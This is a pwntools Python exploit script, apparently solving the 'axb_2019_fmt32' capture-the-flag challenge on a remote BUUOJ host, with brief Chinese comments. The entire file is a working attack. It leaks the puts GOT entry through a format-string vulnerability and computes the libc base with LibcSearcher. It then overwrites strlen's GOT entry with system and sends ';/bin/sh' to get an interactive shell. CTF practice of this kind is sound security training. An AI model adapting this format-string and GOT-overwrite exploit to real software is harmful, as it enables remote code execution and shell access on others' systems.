from pwn import *
from LibcSearcher import *

p = remote('node4.buuoj.cn', 25892)
# p = process('./axb_2019_fmt32')
e = ELF('./axb_2019_fmt32')
context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'

payload1 = b'a'+p32(e.got['puts'])+b'%8$s.'
p.sendafter(b'Please tell me:', payload1)
p.recvuntil(b'Repeater:'+b'a'+p32(e.got['puts']))
# sprintf_addr = int(p.recvuntil(b'.', drop=True).decode(), 16)
puts_addr = u32(p.recv(4))
# print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
strlen_got = e.got['strlen']
# p.info(hex(system-len(b'Repeater:a')))
# p.info(hex(e.got['strlen']))
p.info(hex(sys_addr))

high_sys_addr = (sys_addr >> 16) & 0xffff
low_sys_addr = sys_addr & 0xffff

# 注意这里需要减去前面程序自己会打印的内容的长度，也就是设置numbwritten变量
payload2 = b'a' + fmtstr_payload(offset = 8, writes = {strlen_got:sys_addr}, write_size = 'byte', numbwritten = len(b'Repeater:a'))

# payloadx = b'a' + p32(strlen_got) + p32(strlen_got + 2)
# payloadx += b'%' + str(low_sys_addr - 9 - 9).encode() + b'c%8$hn'
# payloadx +=b'%' + str(high_sys_addr - low_sys_addr).encode() + b'c%9$hn'

# print(payload2, payloadx)

# p.info(payload2.decode())
# print(payload2)
p.sendafter(b'Please tell me:', payload2)
# sleep(1)
p.sendafter(b'Please tell me:', b';/bin/sh\x00') # 加';'分隔命令，这也是一个小知识点

p.interactive()